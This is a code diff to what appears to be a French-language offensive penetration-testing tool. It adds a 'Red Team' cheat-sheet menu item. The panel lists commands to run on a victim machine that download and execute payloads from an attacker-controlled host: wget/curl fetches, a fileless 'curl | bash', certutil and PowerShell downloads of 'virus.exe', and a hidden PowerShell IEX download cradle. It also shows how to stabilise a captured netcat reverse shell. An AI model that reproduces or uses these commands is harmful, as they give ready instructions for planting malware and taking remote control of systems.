@@ -401,9 +401,6 @@ def run_vuln_scanner(ip, open_ports):
         except Exception as e:
             console.print(f"[bold red]Erreur avec Nikto : {e}[/bold red]")
 
-import http.server
-import socketserver
-import threading
 
 # --- ÉTAPE 11 : SERVEUR DE DISTRIBUTION DE PAYLOADS ---
 def serve_payloads():
@@ -499,6 +496,58 @@ def generate_payload():
     except Exception as e:
         console.print(f"[bold red]Erreur lors de la génération : {e}[/bold red]")
 
+
+# --- ÉTAPE 13 : BIBLIOTHÈQUE RED TEAM (CHEAT SHEET) ---
+def show_help_menu():
+    console.print("\n")
+    
+    astuces = """
+[bold cyan]=== 🐧 COMMANDES LINUX (Téléchargement & Exécution) ===[/bold cyan]
+
+[yellow]1. La méthode classique (wget / curl)[/yellow]
+Victime> wget http://<TON_IP>:8080/shell.elf -O /tmp/shell.elf
+Victime> curl http://<TON_IP>:8080/shell.elf -o /tmp/shell.elf
+
+[yellow]2. Donner les droits d'exécution (CRUCIAL)[/yellow]
+Si tu ne fais pas ça, Linux refusera de lancer le virus :
+Victime> chmod +x /tmp/shell.elf
+
+[yellow]3. Exécuter le payload[/yellow]
+Victime> /tmp/shell.elf &  [dim](Le '&' permet de le lancer en arrière-plan sans bloquer le terminal actuel)[/dim]
+
+[yellow]4. L'attaque Fileless (Sans toucher le disque dur - Furtif)[/yellow]
+Télécharge et exécute directement en mémoire vive (RAM) :
+Victime> curl http://<TON_IP>:8080/shell.sh | bash
+
+
+[bold cyan]=== 🪟 COMMANDES WINDOWS (Téléchargement & Exécution) ===[/bold cyan]
+
+[yellow]1. Certutil (La méthode de bourrin, souvent bloquée par l'antivirus)[/yellow]
+Victime> certutil -urlcache -split -f http://<TON_IP>:8080/virus.exe C:\\Temp\\virus.exe
+
+[yellow]2. PowerShell (Plus moderne et efficace)[/yellow]
+Victime> powershell -c "Invoke-WebRequest -Uri http://<TON_IP>:8080/virus.exe -OutFile C:\\Temp\\virus.exe"
+
+[yellow]3. Exécution[/yellow]
+Victime> C:\\Temp\\virus.exe
+
+[yellow]4. L'attaque Fileless PowerShell (Furtif)[/yellow]
+Victime> powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://<TON_IP>:8080/shell.ps1')"
+
+
+[bold cyan]=== 🛠️ ASTUCE : STABILISER UN SHELL LINUX ===[/bold cyan]
+Quand tu attrapes un Reverse Shell netcat, il est souvent buggé (tu ne peux pas faire de flèche du haut, ni Ctrl+C). Tape ça pour le rendre parfait :
+1. python3 -c 'import pty; pty.spawn("/bin/bash")'
+2. Fais Ctrl+Z (ça met le shell en pause)
+3. Tape sur TA Kali : stty raw -echo; fg
+4. Tape : export TERM=xterm
+    """
+    
+    # On affiche tout ça dans un beau cadre Red Team
+    console.print(Panel(astuces, title="[bold red]💀 ANTI-SÈCHE RED TEAM 💀[/bold red]", border_style="red", expand=False))
+    
+    questionary.text("Appuie sur Entrée pour fermer le manuel et retourner au combat...").ask()
+
 # --- MENU PRINCIPAL (INTERACTIF) ---
 def interactive_menu(ip, open_ports):
     while True:
@@ -524,7 +573,8 @@ def interactive_menu(ip, open_ports):
                 "9. ☢️ Scanner de Vulnérabilités Web (Nikto)",
                 "10. 🚁 Héberger/Distribuer des payloads (Serveur Web local)",
                 "11. ☣️ Usine à Reverse Shells (Générer des Payloads)",
-                "12. 🚪 Générer Rapport & Quitter"
+                "12. 📖 Bibliothèque Red Team (Guide & Astuces)",
+                "13. 🚪 Générer Rapport & Quitter"
             ]
         ).ask()
         
@@ -541,7 +591,8 @@ def interactive_menu(ip, open_ports):
         elif "9." in choix: run_vuln_scanner(ip, open_ports)
         elif "10." in choix: serve_payloads()
         elif "11." in choix: generate_payload()
-        elif "12." in choix:
+        elif "12." in choix: show_help_menu()
+        elif "13." in choix:
             generer_html()
             break
 
